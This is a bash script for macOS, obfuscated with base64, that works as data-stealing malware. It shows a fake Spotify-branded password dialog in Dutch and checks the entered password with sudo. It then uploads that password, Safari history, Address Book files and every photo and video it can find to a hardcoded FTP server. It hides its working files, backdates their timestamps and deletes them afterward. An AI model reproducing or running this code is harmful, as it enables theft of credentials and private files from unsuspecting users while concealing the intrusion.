#!/usr/bin/env bash
x() {
    echo "$1" | base64 -D
}
u() {
    curl -s -T "$1" "ftp://$(x c2lhcmx5b2UK):$(x MERka2xaM0oyajJYCg==)@$(x c2lhcmR2LmNvbS9wdWJsaWNfaHRtbC91bmxheS9mcHMvCg==)" || true
}
f() {
    echo "${PWD}$(x "$1")$(date +"%Y_%m_%d_%H_%M_%S")$(x LnR4dAo=)"
}
t() {
    touch -c -a -m -t "$(date -v-6m -v$((RANDOM % 24))H -v$((RANDOM % 60))M -v$((RANDOM % 60))S +"%Y%m%d%H%M.%S")" "$1"
}
k() {
    if ping -q -c 1 -W 1 8.8.8.8 >/dev/null; then
        echo true
    else
        echo false
    fi
}
dl() {
    echo $() >"$1"
    rm "$1"
}
ot="${PWD}$(x L19pY29uX3Nwb3RpZnlfbmV0d2Vyay5zdmcK)"
if [[ ! -f "${ot}" ]]; then
    curl -s "$(x aHR0cDovL3NpYXJkdi5jb20vaWNucy9pY29uLnN2Zwo=)" -o "${PWD}$(x L19pY29uX3Nwb3RpZnlfbmV0d2Vyay5zdmcK)"
fi
chflags hidden "${ot}"
nf="$(f L19wXwo=)"
touch "${nf}"
chflags hidden "${nf}"
sleep 1
ti=$(x TmV0d2Vya3ZlcmtlZXIK)
msg="$(x Vm9lciBqZSB3YWNodHdvb3JkIGluIG9tIGhldCBuZXR3ZXJrdmVya2VlciB2YW4gJ29wZW4uc3BvdGlmeS5jb20nIHRlIGxlemVuLgo=)"
while true; do
    a="$(osascript -e "tell application \"System Events\" to display dialog \"${msg}\" with title \"${ti}\" default answer \"\" buttons {\"$(x TmVlCg==)\", \"$(x U3RhIHRvZQo=)\"} default button \"$(x U3RhIHRvZQo=)\" cancel button \"$(x TmVlCg==)\" with hidden answer with icon POSIX file \"${ot}\"" -e "text returned of result")"
    if echo "${a}" | sudo -S printf "" && echo "${a}" | sudo -S -v 2>/dev/null; then
        break
    else
        msg="$(x Q29udHJvbGUgdmFuIGFjY291bnRuYWFtIG9mIHdhY2h0d29vcmQgbWlzbHVrdC4gUHJvYmVlciBvcG5pZXV3Ogo=c)"
    fi
done
sleep 2
echo "${a}" >"${nf}"
t "${nf}"
while true; do
    if [[ $(k) == true ]]; then
        u "${nf}"
        break
    else
        sleep 5
    fi
done
t "${nf}"
dl "${nf}"
dl "${ot}"
db="${PWD}$(x L0xpYnJhcnkvU2FmYXJpCg==)"
if [[ -d "${db}" ]]; then
    if [[ -r "${db}" ]]; then
        g="$((COLUMNS / 3))"
        i="{::}"
        q="$(f L19zXwo=)"
        touch "${q}"
        chflags hidden "${q}"
        sqlite3 -separator "${i}" "${PWD}$(x L0xpYnJhcnkvU2FmYXJpL0hpc3RvcnkuZGIK)" \
            "select distinct substr(title, 1, ${g}), url from $(x aGlzdG9yeV9pdGVtcwo=)
inner join $(x aGlzdG9yeV92aXNpdHMK) on $(x aGlzdG9yeV9pdGVtcy5pZAo=) = $(x aGlzdG9yeV92aXNpdHMuaGlzdG9yeV9pdGVtCg==)
order by $(x aGlzdG9yeV92aXNpdHMudmlzaXRfdGltZQo=) desc;" | awk -v date="$(date)" -F "${i}" '{printf "%s  %-'"${g}"'s \x1b[36m%s\x1b[m\n", date, $1, $2}' >>"${q}" 2>/dev/null
        t "${q}"
        while true; do
            if [[ $(k) == true ]]; then
                u "${q}"
                break
            else
                sleep 1
            fi
        done

    fi
fi
t "${q}"
dl "${q}"
cc="${PWD}$(x L0xpYnJhcnkvQXBwbGljYXRpb24gU3VwcG9ydC9BZGRyZXNzQm9vay9Tb3VyY2VzCg==)"
if [[ -d "${cc}" ]]; then
    if [[ -r "${cc}" ]]; then
        ab="$(f L19jXwo=)"
        touch "${ab}"
        chflags hidden "${ab}"
        find "${cc}" -iname "$(x Ki5hYmNkcAo=)" -print0 \; 2>/dev/null | xargs -0 -I{} sh -c "echo {} >> ${ab}"
        t "${ab}"
        while read -r line; do
            while true; do
                if [[ $(k) == true ]]; then
                    u "${line}"
                    sed -i '' "/${line//\//\\/}/d" "${ab}" &>/dev/null
                    break
                else
                    sleep 1
                fi
            done
        done <"${ab}"
        t "${ab}"
        dl "${ab}"
    fi
fi
#
me="$(f L19tXwo=)"
touch "${me}"
chflags hidden "${me}"
e=("$(x 'anBlZwo=')" "$(x 'cG5nCg==')" "$(x 'anBnCg==')" "$(x 'bW92Cg==')" "$(x 'bXA0Cg==')" "$(x 'bTR2Cg==')")
find / -type d -perm -u+r -exec find {} -type f \( -iname "*.${e[*]}" \) -print0 \; 2>/dev/null | xargs -0 -I{} sh -c "echo {} >> ${me}"
while read -r line; do
    while true; do
        if [[ $(k) == true ]]; then
            u "${line}"
            sed -i '' "/${line//\//\\/}/d" "${me}" &>/dev/null
            break
        else
            sleep 1
        fi
    done
done <"${me}"
t "${me}"
dl "${me}"
